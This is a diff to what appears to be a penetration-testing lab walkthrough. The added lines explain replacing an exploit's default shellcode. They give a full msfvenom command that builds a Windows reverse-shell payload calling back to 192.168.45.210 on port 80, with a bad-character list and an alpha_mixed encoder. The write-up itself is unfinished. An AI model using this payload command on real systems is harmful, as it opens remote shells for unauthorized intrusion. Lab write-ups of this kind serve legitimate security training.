@@ -80,8 +80,12 @@ To download the exploit, we use
 
 ![](/static/img/screenshot-2024-07-25-at-3.49.23 pm.png)
 
+Looking at the code for the exploit, we see that we need to use msvenom to generate shellcode (replace the default on the exploit file).
 
+![](/static/img/screenshot-2024-07-25-at-3.52.28 pm.png)
 
+Using msfvenom (and the bad string provided in the exploit code, we will use this command to generate our shellcode:
 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.210 LPORT=80-f c -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" -e x86/alpha_mixed
 
 \--- COMING SOON ---
